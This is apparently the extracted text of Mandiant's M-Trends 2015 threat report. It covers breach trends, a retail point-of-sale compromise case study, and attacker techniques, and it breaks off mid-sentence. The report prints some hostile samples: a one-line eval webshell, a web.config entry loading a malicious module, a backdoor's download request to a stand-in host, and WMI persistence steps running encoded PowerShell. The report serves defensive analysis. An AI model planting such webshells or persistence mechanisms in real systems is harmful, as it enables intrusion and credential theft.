{
    "id": "3d0db8e9-f9a5-4882-9b6a-34ae794cc87c",
    "created_at": "2022-10-25T16:48:14.492105Z",
    "updated_at": "2025-03-27T02:17:05.679213Z",
    "deleted_at": null,
    "sha1_hash": "077cdeeefd287808b4b1b8ed262a7a63df21643f",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-02-24T09:02:04Z",
    "file_modification_date": "2015-02-24T09:13:49Z",
    "file_size": 2291610,
    "plain_text": "# SECURITY\n\n\nT H R E A T R E P O R T\n\n®\n##### M-Trends 2015:\n\n### A VIEW FROM  THE FRONT LINES\n\n# SECURITY\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n##### CONTENTS\n\n###### Introduction. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\n\n Victims by the numbers. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\n\n Trend 1: Struggling with disclosure. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n\n A cyber-savvy public. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n\n Rising expectations. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n\n Why the rise in disclosures?. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n\n Trend 2: Retail in the crosshairs. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\n\n Application virtualization servers as an entry point. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\n\n New tools, tactics, and procedures. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7\n\n Increased e-commerce attacks in areas with chip-and-PIN technology. . . . . . . . . . . . . . . . . . . . 7\n\n Recommendations. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .12\n\n Trend 3: The evolving attack lifecycle . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n Hijacking the VPN. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n Hiding malware in plain sight. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n\n Stealing passwords with ease. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18\n\n Moving laterally with WMI and PowerShell. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n Trend 4: Blurred lines—criminal and APT actors take  a page from each others’ playbook. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n It’s complicated: assessing intent in the face of uncertainty. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n Do these differences matter? . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22\n\n Conclusion. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n\n About Mandiant. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\n About FireEye. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\n\n-----\n\n##### INTRODUCTION\n\n###### For years, we have argued that there is no such thing as perfect security. The events of 2014 should put any lingering doubts to rest.\n\n\nhile we have seen modest gains in\norganizations’ ability to attack the\nsecurity gap, advanced (and not-so\n## W\n\nadvanced) threat actors continue to evolve their\ntactics to find a way through it.\n\nIn last year’s M-Trends we noted that cyber\nsecurity had gone from a niche IT issue to a\nboardroom priority. This year, cyber security\n(or perhaps more accurately, cyber insecurity)\nentered the mainstream. In the first few weeks\nof 2015 alone, the issue was a pillar of the U.S.\npresident’s State of the Union address,[1] the plot of\na big-budget film,[2] and the opening punchline of\nHollywood’s Golden Globe awards broadcast.[3]\n\nMandiant consultants’ role as the first responders\nto critical security incidents gives us a unique\nvantage point into how attackers’ motives and\ntactics are changing. The insights and analysis\npresented here represent our combined\nexperience over the course of hundreds of service\nengagements. Over the last decade, we have\nhelped clients across more than 30 industries\naround the globe.\n\nOrganizations made some gains, but attackers\nstill had a free rein in breached environments\nfar too long before being detected—a median\nof 205 days in 2014 vs. 229 days in 2013.\nAt the same time, the number of organizations\ndiscovering these intrusions on their own\nremained largely unchanged. Sixty-nine percent\nlearned of the breach from an outside entity such\nas law enforcement. That’s up from 67 percent\nin 2013 and 63 percent in 2012.\n\n\nRetailers remained a top target as attackers\nfound new ways to steal credit card numbers\nfrom point-of-sale (POS) systems. In areas that\nhave adopted chip-and-PIN credit card security,\nwe saw more attacks on e-commerce and payment\nprocessors than in years past.\n\nSeveral industries that had represented a\nminor portion of our investigations in past\nyears emerged as notable targets: business\nand professional services, healthcare, and\ngovernment and international organizations.\n\nAs security teams deploy new defenses, attackers\nare evolving their tactics. We saw that dynamic in\nfull force over the past year as attackers employed\nnew tactics (or in some cases sharpened triedand-true techniques from the past) to hijack\nvirtual private networking (VPN) security, evade\ndetection, steal credentials, and maintain a\nstealthy, persistent foothold in compromised\nenvironments.\n\nWe also saw more victims publicly disclose their\nincidents than in any past year. At the same time,\nthey’ve had a harder time answering one of the\nfirst questions asked in the wake of a breach:\nwhodunit? The lines are blurring between\nrun-of-the-mill cyber criminals and advanced\nstate-sponsored attackers; the former grew more\nsophisticated and the latter used off-the-shelftools to camouflage their moves.\n\nTaken together, these developments paint a\nthreat landscape that is more complex than ever.\nThe ability of security teams to prevent, detect,\nanalyze, and respond to threat actors has never\nbeen harder—or more crucial.\n\n\n1 Michael D. Shear (The New York Times). “Obama to Announce Cybersecurity Plans in State of the Union Preview.” January 2015.\n\n2 Sheri Linden (The Hollywood Reporter). “’Blackhat’: Film Review.” January 2015.\n\n3 Christopher Palmeri (Bloomberg). “Hollywood ‘Spoiled Brats’ Are Easy Targets at Golden Globes.” January 2015.\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n##### VICTIMS BY THE NUMBERS\n\n###### Attackers targeted a wide spectrum of industries in 2014, including several that we had not seen in large numbers before. While organizations learned of breaches sooner than they did in 2013, attackers still roamed undetected in breached environments far too long. And fewer victims discovered these intrusions on their own.\n\n Industries Where Mandiant Investigated Intrusions\n\n In 2014 we noted changes in the number of engagements at companies in several key industries:\n\n Retail—up from 4% to 14%\n\n Media & Entertainment—down from 13% to 8%\n\n\n###### 7%\nLegal Services\n\n###### 7%\nHigh-Tech & IT\n\n###### 6%\nHealthcare\n\n###### 5%\nTransportation\n\n###### 3%\nAerospace &\nDefense\n\n###### 8%\nOther\n\n\n###### Several industries that had previously represented a minor portion of our investigations emerged as notable targets:\n\n Business & Professional Services\n\n Government & International Organizations\n\n Healthcare\n\n\n###### 17%\nBusiness & Professional\nServices\n\n###### 14%\nRetail\n\n3% 10%\nFinancial Services\n\n5% 8%\nMedia & Entertainment\n\n###### 8%\nConstruction & Engineering\n\n###### 7%\nGovernment & International\nOrganizations\n\n|Col1|Col2|Col3|I e|I e|\n|---|---|---|---|---|\n||||||\n\n\n-----\n\n###### Across the Cyber Threat Landscape\n Cyber threat actors are exploiting networks for an ever-widening array of economic and political objectives.\n\n|Col1|NUISANCE|DATA THEFT|CYBER CRIME|HACKTIVISM|DESTRUCTIVE ATTACK|\n|---|---|---|---|---|---|\n|Objective|Access & Propagation|Economic, Political Advantage|Financial Ga in|Defamation, Press & Policy|Disrupt Operations|\n|Example|Botnets & Spam|Advanced Persistent Threat Groups|Credit Card Theft|Website Defacements|Delete Data|\n|Targeted||||||\n|Character|Often Automated|Persistent|Frequently Opportunistic|Conspicuous|Conflict Driven|\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n##### TREND 1:  STRUGGLING WITH DISCLOSURE\n\n###### More than ever, attacks are thrusting organizations into the media spotlight—and raising expectations for what victims should disclose.\n\n\nn 2014, we worked with more than 30\norganizations that publically disclosed\ndata breaches—often in the harsh spotlight\n\n## I\n\nof a news report. In our experience, providing\nfactual information based on an understanding\nof the scope and extent of the compromise can\nhelp organizations craft a clear and confident\nmessage when they disclose a security incident.\nBy doing so, they may avoid having to correct and\nqualify past statements—and losing credibility in\nthe process.\n\n###### A cyber-savvy public\n\nThe seemingly never-ending series of breach\ndisclosures in 2014 elevated awareness of the\nthreat and impact of targeted attacks among the\npublic and As a result, they are asking more\ninformed and detailed questions when breaches\nare disclosed. The press, partners, investors and\nconsumers no longer want to know simply when\n\n\nthe incident occurred and what data was exposed.\nThey want details about everything from the type\nof malware used to how attackers maintained\naccess.\n\nVictims are also increasingly pressured to disclose\nwho is behind the attack. We are often asked\nto attribute attacks to a specific threat actor on\nthe first day of the investigation, a point where\nwe are only starting to gather evidence of the\ncompromise. By the same token, attribution is\nbecoming more complicated as different kinds of\nthreat actors increasingly share the same tools\n(See Trend 4: Blurred Lines—Criminal and APT\nActors Take a Page from Each Other’s Playbook\non page 20).\n\n###### Raising expectations\n\nAs expectations rise for what should be disclosed,\nvictim organizations are beginning to understand\nhow crucial strong, consistent communication is in\n\n\n###### When formulating a communication strategy, understanding the scope and extent of the compromise is critical. Only then can companies avoid having to correct and qualify past statements, losing credibility in the process.\n\n\n-----\n\nthe wake of major breaches. As more\norganizations disclose breaches publicly, they\nmust often make hard decisions about how\nmuch to share—even while many of the facts\nremain unknown.\n\nIn many cases, organizations must scramble to\nstay ahead of the narrative. For example, we have\nseen situations where public speculation on how\nan attacker gained entry created a whirlwind of\nactivity to disprove those speculations, even as\ninvestigators continued to scope and contain\nthe incident.\n\nThese exercises can distract from the main goal\nof the investigation—finding and following up on\nthe facts—as investigators are asked to disprove\nmultiple theories about the incident.\n\n###### Why the rise in disclosures?\n\nOne question we often get is why more\ncompanies are disclosing. While we cannot\ndefinitively answer that question, two factors\ncould be contributing. First, compared to past\n\n\nyears, we responded to more incidents where\ncardholder data or personally identifiable\ninformation was exposed. In many cases, the\nbreached organization is required by law to\ndisclose certain facts of an incident.\n\nAlso, in 69 percent of the investigations we\nconducted in 2014, victims did not detect the\nattacker on their own. They learned they were\ncompromised from a third party, such as a\nsupplier, customer, or law enforcement.\n\nAnother way of putting this statistic: if you know\nyou are a victim, you can assume that others—and\nnot just the attackers themselves—may know\nabout the incident as well.\n\nRegardless of whether an organization is\nmaking a public disclosure or not, it is important\nto understand that while key stakeholders always\nwant answers right away, investigations can take\nweeks or months and the facts emerge over time.\nThat’s why, when formulating a communication\nstrategy, understanding the scope and extent of\nthe compromise is critical.\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n\n-----\n\n##### TREND 2:  RETAIL IN THE CROSSHAIRS\n\n###### Retailers took center stage in the wake of breaches that hit more than 1,000 businesses and forced countless shoppers to replace their credit cards in 2014.[4] Beyond the sheer volume of retail-focused attacks, our investigations uncovered  new attack groups, toolsets, and techniques used to target this beleaguered industry.\n\n\n###### Application virtualization servers as an entry point\n\nApplication virtualization technologies allow\nusers to connect remotely to a fenced-off\ndesktop environment with access limited to\nspecific programs. When set up properly, this\napproach creates a protective bubble of sorts to\nkeep users safely confined within the virtual\nenvironment. But in some cases, even minor\nconfiguration mistakes leave gaps in the bubble.\nAttackers escape from the virtual environment\nand roam into other parts of the system.\n\nIn every case we investigated that involved\nthis attack vector, we saw the same primary\nsecurity gap: remote access to the application\nrequired only a user name and a password.\nTwo-factor authentication would have\nhelped control this attack vector.\n\n###### New tools, tactics, and procedures\n\nWith new attack groups came new tools, tactics,\nand procedures. Their prowess ran the gamut—\nwe saw everything from novice attackers who\nused publicly available tools to more advanced\ngroups wielding sophisticated card-harvesting\nmalware tailored to specific POS applications.\n\n\nRegardless of skill—or lack thereof—novice attack\ngroups proved as effective at stealing cardholder\ndata as their more advanced counterparts. Each\nattack group moved undetected throughout\nvictims’ environments, gained access to the POS\nsystems, and installed card-harvesting malware.\n\n###### Increased e-commerce attacks in areas with chip-and-PIN technology\n\nEuropay, MasterCard, and Visa (EMV)\ntechnology—also known as chip-and-PIN\nauthentication—is finally heading to the U.S.\n(Though widely adopted in many regions, the\ndecades-old global standard has been slow to\ncatch on among U.S. retailers.)\n\nEMV-enabled credit cards generate a unique\ncode for each transaction, making counterfeits\nmuch more difficult. That may be pushing cyber\ncriminals to softer targets. In countries that\nhave adopted EMV technology, we responded\nto more compromises of e-commerce companies\nand payment processors than we have in the past.\n\n\n4 U.S. Department of Homeland Security and U.S. Secret Service. “Backoff Malware: Infection Assessment.” August 2014.\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n###### CASE STUDY\n\n How one attacker breached a large U.S. retailer, compromising  millions of credit cards over a three-month period\n\n\nThe attack echoes a storyline retailers\nhave seen throughout 2014: remotely\naccessing the victim’s system with\nvalid credentials, using them to move\nlaterally within the victim’s network,\nand deploying POS malware to store\nregisters. Only after being notified\nby U.S. authorities did the retailer\nknow about the ongoing breach in\nits environment.\n\n###### Initial point of compromise\n\nThe attacker connected to the retailer’s\nvirtualized application server using\nlegitimate credentials. The application\nserver gave the attacker a virtualized\ndesktop with limited privileges. We\nfound no failed logon attempts, which\nindicates that the attacker had obtained\nthe account credentials before the\nattack. (How the attacker obtained those\ncredentials is unclear from the evidence\navailable to us.)\n\nThe attacker then took advantage of a\nminor misconfiguration in the virtualized\ndesktop to elevate system privileges and\ngain command-line access—direct\ncontrol of the system. The attacker used\nWindows FTP to download a passworddumping tool. With that tool, the\nattacker gained the password for the\nlocal administrator account. This\npassword was the same across every\nsystem in the retailer’s environment.\n\nAll of that happened in a matter\nof minutes.\n\n\n###### Lateral movement\n\nIn the early stages of the attack, the\nattacker used the Metasploit framework\nto move laterally throughout the\nenvironment. Metasploit—an opensource attack framework used to\ndevelop, test, and execute exploit\ncode—has a vast array of modules that\nhelp users find and exploit weakness in a\ntargeted system. This variety makes it a\nfavorite among security researchers and\ncyber criminals alike.\n\nThe Metasploit module used in this\ncase was psexec_command, which\nallows attackers to run commands\non the compromised system. The\nmodule executes commands as a\nWindows service. It leaves a number\nof forensic artifacts in the Windows\nsystem-event log.\n\nWhile continuing to access compromised\nsystems, the attacker zeroed in on the\ndomain controller that served the\ncorporate environment. Domain\ncontrollers are servers that manage\nauthentication in a Windows\nenvironment. The domain controller\nshared the local administrator\ncredentials the attacker had obtained,\nmaking it an easy target. The attacker\nthen used the Metasploit ntdsgrab\nmodule to obtain a copy of the NTDS\ndatabase and system registry hive.\n\nThe NTDS database stores Active\nDirectory information that domain\ncontrollers use, which includes user\nnames and password hashes. The\n_ntdsgrab module uses the Windows_\nVolume Shadow Copy Service (VSS) to\ncreate a shadow copy of the partition\n\n\nthat holds the NTDS database. VSS\ncreates a snapshot of the system for\nlegitimate backup and restore functions.\nIn this case, the attacker used VSS to\ncreate a copy of the NTDS database.\nWith that copy, the attacker could then\nuse other tools to extract password\nhashes.\n\nAfter cracking the domain administrator\npassword hashes, the attacker used\nthem to move laterally throughout\nthe environment.\n\nAt that point, the attacker switched from\nMetasploit to more traditional lateral\nmovement techniques such as noninteractive network logons, Microsoft’s\nSysInternals PsExec tool, and Remote\nDesktop Protocol (RDP) logons. After\nlogging into the virtualized application\nserver with the domain administrator\naccount, the attacker could log into\nsystems via RDP for greater access.\n\n###### Backdoor\n\nTo maintain a foothold in the\ncompromised environment, the\nattacker deployed a backdoor to several\nmachines. The backdoor was a malicious\ndevice driver that targeted Windows\nXP systems.\n\nThe malware was packed with a\nhighly sophisticated packer similar to\nthose found in advanced but widely\navailable malware. The device driver first\nunpacks itself in memory and launches a\nnew system thread.\n\nThe original driver then alerts the\nsystem that it failed to load. Because\nthe unpacked code runs in a separate\n\n\n-----\n\n###### How psexec_command works:\n\nThe psexec_command module writes\nthe command to be executed and\noutput file (a text file) to a Windows\nbatch file. Both the text file and the\nWindows batch file are randomly\ngenerated 16-character file names.\n\nIt then executes the Windows batch\nfile created in step 1.\n\nFigure 1 shows service information\nthat is written out to the Windows\nsystem event log.\n\nprocess from the original driver, the\nmalware runs even though Windows\ndoes not recognize the driver as being\nloaded. These techniques hamper\nreverse-engineering efforts and help\nhide the backdoor’s functions.\n\nThe backdoor gets its capabilities\nfrom shellcode that the unpacked\ndriver injects into user-space processes\n(processes that run outside of the\nWindows kernel). The shellcode\nmakes an HTTP POST request to a\nhard-coded IP address and downloads\nXOR-encoded shellcode contained\nwithin an HTML comment.\n\nThis technique made the backdoor\nvery versatile. Adding new features\nwas as easy as downloading and running\nnew shellcode. Using shellcode in this\nway is not new, but using it in tandem\nwith the packer made this malware\nvery sophisticated.\n\nFigure 2 details the backdoor’s\ncommunication with the commandand-control (CnC) server.\n\n\n**Figure 1: Metasploit psexec_command module service installation**\n\nPOST /evil.txt HTTP/1.0\nAccept: */*\nContent-Length: 32\nContent-Type: application/octet-stream\nUser-Agent: Evil_UA_String\nHost: 1.2.3.4\nPragma: no-cache\n<POST_DATA>\n\nBackdoor sends HTTP POST\nrequest to CnC server\n\n**Infected** Download and execute\n**System** XOR encoded shellcode\n\n**Figure 2: Backdoor communication**\n\n```\nA service was installed in the system.\nService Name: MRSWxwQmQxFGumEFsW\nService File Name: %COMSPEC% /C echo dir ^>\n%SYSTEMDRIVE%\\WINDOWS\\Temp\\TthwsVKvUhydrsNB.txt > \\\nWINDOWS\\Temp\\RbhRmgALAHcdyWXG.bat & %COMSPEC% /C\nstart %COMSPEC% /C \\WINDOWS\\Temp\\RbhRmgALAHcdyWXG.\nbat\nService Type: user mode service\nService Start Type: demand start\n\n```\n\n-----\n\n**M-Trends** A view from the front lines\n\n###### All registers throughout the retail chain authenticated  to the central domain controller. This means that anyone with access to the retail domain controller could directly access store registers.\n\n\n###### Stealing data\n\nAfter obtaining the plaintext domain\nadministrator password, the attacker had\nfree rein to Windows systems in the\ncorporate environment.\n\nFrom there, the attacker focused on\ngaining access to the retail environment.\n\nThe retail environment was configured\nas follows:\n\n- The retail domain had a two-way\ntrust with the corporate domain.\n\n- The store registers ran Microsoft\nWindows XP.\n\n- The store registers were joined to\nthe retail domain.\n\nThis configuration, which is common\namong retailers, gave the attacker two\nadvantages.\n\nFirst, the domain administrator\ncredentials obtained earlier gave the\nattacker a working privileged account\nthat opened access to systems in the\nretail domain.\n\nSecond, the retail domain was a child\ndomain of the corporate domain. For\ncertain functions to work, the domain\ncontrollers required certain critical ports\nto remain open between the corporate\nand retail domain controllers. The open\nports bypassed all other firewall rules\nthe retailer had in place. The attacker\nused these open ports to access the\ndomain controller and use it to pivot into\nthe retail environment.\n\nAll registers throughout the retail chain\nauthenticated to the central domain\ncontroller. This means that anyone with\naccess to the retail domain controller\n\n\ncould directly access store registers.\nThe attacker used a Windows batch\nscript on the retail domain controller\nto copy the POS card-harvesting\nmalware to registers in every one\nof the retailer’s stores.\n\nThe attacker then ran the malware using\na scheduled Windows task. The POS\nmalware collected track data—including\nthe credit card account number and\nexpiration date stored on the magnetic\nstripe—from the POS application’s\nprocess memory. Attackers can sell this\ntrack data to criminals who create\ncounterfeit cards.\n\nThe POS card-harvesting malware used\nOSQL, a command-line SQL query tool\npreinstalled with the registers, to write\nharvested track data to the temporary\nMSSQL database tempdb. Data in the\n_tempdb table is cleared when the MSSQL_\nservice stops. Once a day, the attacker\nwould query the tempdb database on all\nstore registers and send the output of\nthe SQL query to a text file on the\ndomain controller.\n\nFrom there, the attacker archived the\ntext file that contained harvested track\ndata and transferred it to a workstation\nin the retail environment that had\noutbound Internet access. The attacker\ntransferred the file from the workstation\nto an attacker-controlled server using\nFTP.\n\nFigure 3 shows how the attack unfolded.\n\n\n-----\n\n**Retail Domain**\n\n\n**Store 1**\n\n\n**DMZ**\n\n\n**Figure 3: Summary of the attack**\n\n\n**Store 2**\n\n\n**Corporate Domain**\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n\n###### THE TAKEAWAY: Where money goes, criminals will follow. Retailers have always been in the crosshairs of financially motivated cyber criminals. We saw no change to this in 2014. While attackers used some new techniques and grabbed more headlines, their playbook remained largely consistent with what we have observed over the last few years.\n\n\n###### over the last few years.\n\n\n-----\n\n##### TREND 3:  THE EVOLVING ATTACK LIFECYCLE\n\n###### Most incidents we investigate follow a familiar pattern. We call this the  attack lifecycle.\n\n\nt’s like a game of cat and mouse: security\nteams put new defenses in place, and then\nattackers change their tactics. This continued\n\n## I\n\nin 2014. We saw more intrusions that usurped\nVPNs to maintain access to victims’ environments.\nWe also saw clever new techniques to evade\ndetection, and new tools and tactics to steal\ncredentials and move laterally throughout a\ncompromised environment.\n\n###### Hijacking the VPN\n\nGaining access to a target’s VPN gives attackers\ntwo huge advantages. First, they can persist in an\nenvironment without having to deploy backdoors.\nSecond, they can blend in by imitating authorized\nusers.\n\nIn past years, we have investigated threat groups\nthat, after gaining a foothold in a compromised\nnetwork, immediately targeted VPN assets and\ncredentials. In 2014, this trend hit a new\nwatermark: we saw more cases in which attackers\ngained access to victims’ VPNs than ever before.\n\nWe observed two common VPN attack techniques\nacross most of our engagements:\n\n- **Single-factor authentication: If the victim’s**\nVPN required only a valid username and\npassword, the attacker simply re-used\ncredentials stolen from compromised\nend-user systems or the Active Directory\ndomain.\n\n\n\n- **Certificate-based two-factor**\n**authentication: If the victim’s VPN required**\na per-user digital certificate as a second\nauthentication factor, attackers used widely\navailable tools such as Mimikatz to extract\nthese certificates from compromised\nend-user systems. We also observed cases\nwhere the attacker stole VPN certificates\nthat had been distributed to users in an\ninsecure manner, such as attached to\nunencrypted emails or stored on open\nnetwork file-shares.\n\nIn a smaller number of cases, attackers used\nexploits to bypass VPN authentication altogether.\nOne such example was “Heartbleed,” a\nvulnerability in the Transport Layer Security (TLS)\nHeartbeat extension that made headlines in April\n2014. Affected servers and devices could be\ncoaxed into returning up to 64 kilobytes of data\nfrom the memory upon request.\n\nResearchers initially debated the impact of this\nvulnerability and whether sensitive data, such as\nencryption keys or user credentials, could be\nstolen in real-world attacks.\n\nTheir worst-case fears came true. Within weeks of\nthe Heartbleed disclosure, we investigated a case\nin which an attacker used the vulnerability against\na VPN device to hijack authorized users’\nauthenticated sessions to gain access—no\ncredentials required. In the ensuing weeks,\nattackers used Heartbleed to access other victims’\nVPN infrastructures.\n\n\n-----\n\n**M-Trends** A view from the front lines\n\n###### As defenses evolve, attackers adapt and innovate. In 2014 we observed new and emerging techniques at each stage of the attack lifecycle. These are a few highlights.\n\n\n**Hiding Webshells**\nAttackers continued to use novel techniques to\ndeploy and hide web-based malware. Mandiant\nsaw several stealthy techniques, including the\nfollowing:\n\n- Shells planted on servers that used SSL\nencryption to evade network monitoring\n\n- Single-line “eval” shells embedded in\nlegitimate web pages\n\n- Server configuration files that were modified\nto load malicious DLLs\n\n\n**Leveraging WMI and PowerShell**\nAttackers increasingly adopted\nWMI and PowerShell, two\npowerful built-in components of\nWindows, to maintain a presence,\ngather data, and move laterally.\n\n\nInitial Establish Escalate Internal Complete\nCompromise Foothold Privileges Recon Mission\n\n\n**Plaintext Passwords**\nAttackers used recompiled variants\nof the Mimikatz utility to steal\nplaintext passwords from memory\nwhile evading anti-virus detection.\n\n**Figure 4: New attacker techniques observed during Mandiant investigations**\n\n\n**Kerberos Attacks**\nAfter gaining domain administrator\nprivileges, attackers used the Kerberos\ngolden ticket attack to authenticate as\nany privileged account—even after\ndomain password resets.\n\n\nIn all of these cases, VPN logs were a telltale\nsource of evidence: the source IP addresses of\nauthenticated user sessions targeted by the\nattack would change quickly, switching between\naddress blocks owned by distinct IP providers\nacross separate geographies.\n\n###### Hiding malware in plain sight\n\nMalware detection is a constant arms race\nbetween attackers and defenders, and that trend\ncontinued in 2014. We saw attackers use several\nnew techniques to camouflage their actions and\ndisguise persistent malware on infected systems.\n\n###### Hiding webshells\n\nWeb-based backdoors, also known as webshells,\nare a decade-old form of malware. And thanks to\nnovel techniques to disguise them from network\nand host-based detection, they remain popular for\ntargeted attacks.\n\n\nWe studied several cases in which attackers\ncleverly installed their webshells on servers that\nused secure-socket layer (SSL) encryption. As a\nresult, all requests to and from the backdoor were\nencrypted with the server’s own legitimately\ninstalled private key. Because the victims had not\nconfigured their network architectures to permit\nsecurity tools to inspect SSL traffic, the attacker’s\nactions went undetected.\n\nWe expect this trend to continue, especially as\nmore organizations adopt SSL encryption for all\nInternet-facing web services.\n\nAnother stealthy technique that we witnessed\nentailed hijacking legitimate web pages with\nembedded “eval” shells—small backdoor scripts\ndesigned to execute code submitted within a\nHTTP request parameter. An eval shell can be only\na few dozen bytes long, making it easy to disguise\nwithin a larger HTML file.\n\n\n-----\n\nFor normal HTTP requests, the eval-compromised\nweb page renders as usual. But if an attacker\nrequests the page using the right parameter, the\neval statement parses and runs the submitted\n(malicious) code.\n\nFigure 5 shows a complete eval shell that could\nreside on its own or within another web page. The\nattacker’s webshell client would need to embed\nmalicious code in request parameter p1.\n\nA final example of web-based malware was\nparticularly crafty: the attacker altered the\nconfiguration file (web.config) for a web server\nrunning Microsoft Internet Information Services\n(IIS). This change caused the server to load a\nmalicious HTTP module. Figure 6 shows a\nsanitized excerpt of the modified web.config.\n\nThis change ensured that the server loaded\n_BadModule.dll from a shared modules directory_\nand used it to process all subsequent web\nrequests. The malware parsed and captured the\ncontents of any web request submitted to the\nserver—including application user credentials.\nFigure 6 is a sanitized example. In the actual case,\nthe module name mimicked a real Microsoft DLL.\nThe attacker also altered the timestamps of both\nthe malware and configuration file to evade\ndetection.\n\n###### Persisting with WMI\n\nWindows Management Instrumentation (WMI) is\na core component of Windows that provides a\nbroad set of system management capabilities and\n\n\ninterfaces. Applications and scripting languages,\nincluding PowerShell and VBScript, can use WMI\nto collect data, interact with low-level OS\ncomponents, and execute commands. WMI also\nprovides an event framework that can trigger\napplications—including malware—based on\nchanges to the state of specified objects.\n\nIn past years, we have not seen many attackers\nuse WMI to evade detection. This is likely because\ninteracting with WMI is complex, and more basic\npersistence techniques were enough to evade\ndetection. In 2014, however, we have observed a\nsmall number of threat groups using WMI to\nmaintain a covert presence.\n\nThis technique entails creating three WMI objects\n(typically via PowerShell):\n\n- **Event Filter: This involves polling the system**\nfor a recurring event that can serve as a\npersistence mechanism, such as a specific\ntime of day or elapsed seconds since boot.\n\n- **Event Consumer: Runs a specified**\nscript or command to “consume” the event.\nAttackers typically created command-line\nevent consumers, which execute an arbitrary\ncommand and arguments, or Active Script\nevent consumers, which execute VBScript.\n\n- **Filer to Consumer Binding: This ensures**\nthat a specified consumer runs when a filter\nis triggered.\n\n```\n<%@ Page Language=”Jscript”%><%eval(Request.Item[“p1”],”unsafe”);%>\n\n```\n\n**Figure 5: Example of “eval” webshell**\n\n```\n<!--HTTP Modules -->\n  <modules>\n    <add type=”Microsoft.Exchange.Clients.BadModule” name=”BadModule” />\n  </modules>\n\n```\n\n**Figure 6: Excerpt from modified web.config**\n\n\n-----\n\n**M-Trends** A view from the front lines\n\nAttacker issues PowerShell commands to create three WMI event objects:\n###### 1 a consumer that runs a command or script, a filter that polls the system\nfor a recurring condition, and a binding to link the filter to the consumer.\n\n**WMI Root Subscription Namespace**\n\n**Event Consumer** **Event Filter**\n_“Run this script or_ _“Poll the system for_\n\n**Set-WmiInstance**\n\n_command...”_ _this recurring event...”_\n\n**Filter to Consumer Binding**\n_“Use this filter to trigger this consumer”_\n\nWMI regularly polls the system for the query in the event filter. In this\n###### 2 example, the filter condition is satisfied daily at 8:05.\n\n**SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE**\n**TargetInstance ISA 'Win32_LocalTime' AND**\n**= 08 AND TargetInstance.Minute = 05 GROUP WITHIN 60**\n\nWhen the filter is triggered, WMI automatically launches the event\n###### 3 consumer bound to it. This example shows part of a command line\nconsumer that runs PowerShell with additional malicious code\nsupplied as a Base64-encoded argument.\n\n**CommandLineTemplate=\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\**\n**–NonInteractive –enc SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABl...**\n\n**Figure 7: How threat actors use WMI to maintain persistence**\n\n\nWhen the filter is triggered, WMI automatically launches the event\n###### 3 consumer bound to it. This example shows part of a command line\nconsumer that runs PowerShell with additional malicious code\nsupplied as a Base64-encoded argument.\n\n**CommandLineTemplate=\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe**\n**–NonInteractive –enc SQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAALQBDAG8AbQBwAHUAdABl...\"**\n\n\nfor a recurring condition, and a binding to link the filter to the consumer.\n\n**WMI Root Subscription Namespace**\n\n**Event Consumer** **Event Filter**\n_“Run this script or_ _“Poll the system for_\n\n**Set-WmiInstance**\n\n_command...”_ _this recurring event...”_\n\n**Filter to Consumer Binding**\n_“Use this filter to trigger this consumer”_\n\n\n-----\n\nFigure 8 shows an example of PowerShell syntax\nto create a WMI command-line consumer, which\nin turn runs powershell.exe with a 